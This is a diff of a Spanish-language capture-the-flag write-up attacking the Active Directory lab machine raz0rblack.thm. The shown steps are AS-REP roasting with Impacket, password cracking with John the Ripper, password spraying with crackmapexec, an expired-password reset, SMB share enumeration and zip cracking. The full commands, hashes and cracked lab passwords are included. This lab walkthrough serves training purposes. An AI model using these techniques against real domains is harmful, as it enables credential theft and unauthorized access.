@@ -163,45 +163,21 @@ steven bradley			STEGO SPECIALIST
 chamber lin			CTF PLAYER(INACTIVE)
 
 Con esta información hago una wordlist y la uso para ver hacer un ataque AS-REP, para ver si consigo algun hash de contraseña de kerberos.
-cat /home/mksk/wordlists/adusers.txt 
-ljudmila
-rico
-tyson
-steven
-chamber
-daven
-imogen
-tamara
-arthur
-carl
-nolan
-reza
-daven
-imogen
-tamara
-arthur
-carl
-nolan
-reza
-ljudmila
-rico
-tyson
-steven
-chamber
-ljudmila.vetrova
-ljudmila_vetrova
+cat adusers.txt 
 lvetrova
-vetrova
-tyson.williams
-twilliams
-steven.bradley
 sbradley
-rico.delgado
 rdelgado
-daven.royce
 droyce
-imogen.royce
 iroyce
+dport
+aedwards
+ningram
+rzaydan
+clin
+tvidal
+ncassidy
+twilliams
+
 
 Consigo un hash.
 /opt/impacket$ python3 examples/GetNPUsers.py raz0rblack.thm/ -usersfile /home/mksk/wordlists/adusers.txt -dc-ip 10.128.144.87 -no-pass
@@ -252,3 +228,132 @@ cat /home/mksk/snap/john-the-ripper/694/.john/john.pot
 $krb5asrep$23$1a00be9962362f2893b8cd5750f5ec25$5a1eeb52db4ef871329d2ecb18935e4695463f3377e1134d0214f1890ed3fbf33ae0700ddb8a9adc22f53d56fc6bd3b5975ad9cc6b063e0025006f5043ab4e8afccef035e83753891a78c5c6165884ed89eec807b7199f3b499c61acdedcbfb19fff896fabb3c6abfc1f3c88a4895ac5cf88400283507fa17d42612765e3e9f361679dc0d5b6b0b85b02aa651fab4ecff3206537aa1ed00d0b0a6cb667cc079fb35dccd220be8ee53ea6732de189c1585007776ea360a1b4ce6d156ea90725a0109cff1a0b55d2aae2f0bccde73004582835a24fee1c55b2bf6fd1205c9390db1a0691f421c25aaad8f2e42b71af061e:roastpotatoes
 
 En este punto tengo un set de credenciales twilliams:roastpotatoes. Pruebo en varios servicios, y consigo meterme en smb.
+
+smbmap -H 10.130.190.151 -u 'twilliams' -p 'roastpotatoes'
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+ -----------------------------------------------------------------------------
+     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[*] Detected 1 hosts serving SMB
+[*] Established 1 SMB session(s)                                
+                                                                                                    
+[+] IP: 10.130.190.151:445	Name: 10.130.190.151      	Status: Authenticated
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Remote Admin
+	C$                                                	NO ACCESS	Default share
+	IPC$                                              	READ ONLY	Remote IPC
+	NETLOGON                                          	READ ONLY	Logon server share 
+	SYSVOL                                            	READ ONLY	Logon server share 
+	trash                                             	NO ACCESS	Files Pending for deletion
+
+Navego un poco por las shares pero no encuentro nada, vuelvo a la enumeración.
+
+crackmapexec smb raz0rblack.thm 10.130.190.151 -u /home/mksk/wordlists/adusers.txt -p 'roastpotatoes' --shares
+SMB         10.130.190.151  445    HAVEN-DC         [*] Windows 10.0 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False)
+SMB         10.130.190.151  445    HAVEN-DC         [*] Windows 10.0 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False)
+SMB         10.130.190.151  445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:roastpotatoes STATUS_LOGON_FAILURE 
+SMB         10.130.190.151  445    HAVEN-DC         [-] raz0rblack.thm\sbradley:roastpotatoes STATUS_PASSWORD_MUST_CHANGE 
+SMB         10.130.190.151  445    HAVEN-DC         [-] raz0rblack.thm\rdelgado:roastpotatoes STATUS_LOGON_FAILURE 
+SMB         10.130.190.151  445    HAVEN-DC         [-] raz0rblack.thm\droyce:roastpotatoes STATUS_LOGON_FAILURE 
+SMB         10.130.190.151  445    HAVEN-DC         [-] raz0rblack.thm\iroyce:roastpotatoes STATUS_LOGON_FAILURE 
+SMB         10.130.190.151  445    HAVEN-DC         [-] raz0rblack.thm\dport:roastpotatoes STATUS_LOGON_FAILURE 
+SMB         10.130.190.151  445    HAVEN-DC         [-] raz0rblack.thm\aedwards:roastpotatoes STATUS_LOGON_FAILURE 
+SMB         10.130.190.151  445    HAVEN-DC         [-] raz0rblack.thm\ningram:roastpotatoes STATUS_LOGON_FAILURE 
+SMB         10.130.190.151  445    HAVEN-DC         [-] raz0rblack.thm\rzaydan:roastpotatoes STATUS_LOGON_FAILURE 
+SMB         10.130.190.151  445    HAVEN-DC         [-] raz0rblack.thm\clin:roastpotatoes STATUS_LOGON_FAILURE 
+SMB         10.130.190.151  445    HAVEN-DC         [-] raz0rblack.thm\tvidal:roastpotatoes STATUS_LOGON_FAILURE 
+SMB         10.130.190.151  445    HAVEN-DC         [-] raz0rblack.thm\ncassidy:roastpotatoes STATUS_LOGON_FAILURE 
+SMB         10.130.190.151  445    HAVEN-DC         [+] raz0rblack.thm\twilliams:roastpotatoes 
+SMB         10.130.190.151  445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:roastpotatoes STATUS_LOGON_FAILURE 
+SMB         10.130.190.151  445    HAVEN-DC         [-] raz0rblack.thm\sbradley:roastpotatoes STATUS_PASSWORD_MUST_CHANGE 
+SMB         10.130.190.151  445    HAVEN-DC         [-] raz0rblack.thm\rdelgado:roastpotatoes STATUS_LOGON_FAILURE 
+SMB         10.130.190.151  445    HAVEN-DC         [-] raz0rblack.thm\droyce:roastpotatoes STATUS_LOGON_FAILURE 
+SMB         10.130.190.151  445    HAVEN-DC         [-] raz0rblack.thm\iroyce:roastpotatoes STATUS_LOGON_FAILURE 
+SMB         10.130.190.151  445    HAVEN-DC         [-] raz0rblack.thm\dport:roastpotatoes STATUS_LOGON_FAILURE 
+SMB         10.130.190.151  445    HAVEN-DC         [*] Enumerated shares
+SMB         10.130.190.151  445    HAVEN-DC         Share           Permissions     Remark
+SMB         10.130.190.151  445    HAVEN-DC         -----           -----------     ------
+SMB         10.130.190.151  445    HAVEN-DC         ADMIN$                          Remote Admin
+SMB         10.130.190.151  445    HAVEN-DC         C$                              Default share
+SMB         10.130.190.151  445    HAVEN-DC         IPC$            READ            Remote IPC
+SMB         10.130.190.151  445    HAVEN-DC         NETLOGON        READ            Logon server share 
+SMB         10.130.190.151  445    HAVEN-DC         SYSVOL          READ            Logon server share 
+SMB         10.130.190.151  445    HAVEN-DC         trash                           Files Pending for deletion
+SMB         10.130.190.151  445    HAVEN-DC         [-] raz0rblack.thm\aedwards:roastpotatoes STATUS_LOGON_FAILURE 
+SMB         10.130.190.151  445    HAVEN-DC         [-] raz0rblack.thm\ningram:roastpotatoes STATUS_LOGON_FAILURE 
+SMB         10.130.190.151  445    HAVEN-DC         [-] raz0rblack.thm\rzaydan:roastpotatoes STATUS_LOGON_FAILURE 
+SMB         10.130.190.151  445    HAVEN-DC         [-] raz0rblack.thm\clin:roastpotatoes STATUS_LOGON_FAILURE 
+SMB         10.130.190.151  445    HAVEN-DC         [-] raz0rblack.thm\tvidal:roastpotatoes STATUS_LOGON_FAILURE 
+SMB         10.130.190.151  445    HAVEN-DC         [-] raz0rblack.thm\ncassidy:roastpotatoes STATUS_LOGON_FAILURE 
+SMB         10.130.190.151  445    HAVEN-DC         [+] raz0rblack.thm\twilliams:roastpotatoes 
+SMB         10.130.190.151  445    HAVEN-DC         [*] Enumerated shares
+SMB         10.130.190.151  445    HAVEN-DC         Share           Permissions     Remark
+SMB         10.130.190.151  445    HAVEN-DC         -----           -----------     ------
+SMB         10.130.190.151  445    HAVEN-DC         ADMIN$                          Remote Admin
+SMB         10.130.190.151  445    HAVEN-DC         C$                              Default share
+SMB         10.130.190.151  445    HAVEN-DC         IPC$            READ            Remote IPC
+SMB         10.130.190.151  445    HAVEN-DC         NETLOGON        READ            Logon server share 
+SMB         10.130.190.151  445    HAVEN-DC         SYSVOL          READ            Logon server share 
+SMB         10.130.190.151  445    HAVEN-DC         trash                           Files Pending for deletion
+
+Descubro que el usuario sbradley tiene la contraseña vencida.
+Y como sabemos por la salida de GetPNUsers.py, no tiene preautenticación.
+
+Con smbpasswd me da error asique finalmente lo hago con changepasswd.py de impacket.
+
+python3 examples/changepasswd.py -newpass 'Sisisi123' 'raz0rblack.thm/sbradley:roastpotatoes@10.130.190.151'
+
+Y vuelvo a hacer un smbmap con las nuevas credenciales:
+smbmap  -H 10.130.190.151 -u 'sbradley' -p 'Sisisi123'
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+ -----------------------------------------------------------------------------
+     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[*] Detected 1 hosts serving SMB
+[*] Established 1 SMB session(s)                                
+                                                                                                    
+[+] IP: 10.130.190.151:445	Name: raz0rblack.thm      	Status: Authenticated
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Remote Admin
+	C$                                                	NO ACCESS	Default share
+	IPC$                                              	READ ONLY	Remote IPC
+	NETLOGON                                          	READ ONLY	Logon server share 
+	SYSVOL                                            	READ ONLY	Logon server share 
+	trash                                             	READ ONLY	Files Pending for deletion
+
+Ahora si que tengo acceso la share trash, me meto y descargo los 3 archivos que encuentro.
+Esta otra vez la flag de sbradley, un .zip y un txt que me indica que en el .zip hay hashes dumpeados por Zerologon.
+
+El .zip pide contraseña, asique lo paso por zip2john y lo crackeo.
+ unzip experiment_gone_wrong.zip 
+Archive:  experiment_gone_wrong.zip
+[experiment_gone_wrong.zip] system.hive password: 
+
+
+john-the-ripper.zip2john experiment_gone_wrong.zip > hash_zip.txt
+ver 2.0 efh 5455 efh 7875 experiment_gone_wrong.zip/system.hive PKZIP Encr: TS_chk, cmplen=2941739, decmplen=16281600, crc=BDCCA7E2 ts=591C cs=591c type=8
+ver 2.0 efh 5455 efh 7875 experiment_gone_wrong.zip/ntds.dit PKZIP Encr: TS_chk, cmplen=15985077, decmplen=58720256, crc=68037E87 ts=5873 cs=5873 type=8
+NOTE: It is assumed that all files in each archive have the same password.
+If that is not the case, the hash may be uncrackable. To avoid this, use
+option -o to pick a file at a time.
+
+cat /home/mksk/snap/john-the-ripper/694/.john/john.pot
+$pkzip$2*1*1*0*8*24*5873*0aca701e8077fc71fdf3a651de93e9b7b37ed5d4d48cec36ca963b52725f64627720ff63*2*0*2ce32b*f87000*bdcca7e2*0*45*8*2ce32b*591c*814528b2d2873ca5ff944f13e6ec1f8c5544aee691fe97d65403f319e744ecc9722c2d47230583558ac307a93d21473c5b38d3f73e56a35ce3e473aa9bd4fd97f249abeedac3ce349c0798809c80fc764944607c79ebff0f19bf637a557262b8dbda9e7f60e05add20ff3c63482a32a1af83ac71df200ea9461462bc725dc2c25fd95ff76a4d8a0991a2175e625bd195c7592a361d51553ad1621907afc18dd6571c130671ddadd53552ec1fa4ea9da878b21e9ecf8cee5b68ccafb370b20c62fd4ba63607f98d9e669f57602c40e2b612ff99ed63ff159fc9196002f9efe01478ee081bcd928b5143a2c80d5757f32c43483f41d3d584552901b55f394948b42c4c7106c70c48c70e02b76a35bb4664dd05f96ef5e55de735cfe60d10d711310b023e448c74cd7ca5ce80a892f2db2dd5bfab0a5486fb02259f234eda638c751772bcacd18bd923b9799ec79ae1d5e6c061858e5773edf3b9737e9b9bb1ac75635$SOURCE_HASH$c525b5ce08affaee87c1cb44c657f7fb:electromagnetismo
